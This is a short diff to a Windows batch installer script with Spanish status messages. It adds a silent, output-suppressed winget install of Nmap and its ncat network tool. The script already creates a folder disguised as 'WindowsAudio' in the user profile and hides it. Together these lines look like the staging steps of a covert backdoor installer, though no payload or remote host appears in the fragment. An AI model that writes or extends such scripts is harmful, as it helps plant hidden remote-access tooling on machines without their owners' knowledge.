@@ -1,4 +1,6 @@
 @echo off
+echo [*] Instalando Nmap (ncat)...
+winget install Insecure.Nmap --silent > nul 2>&1
 echo [*] Instalando...
 mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
 attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
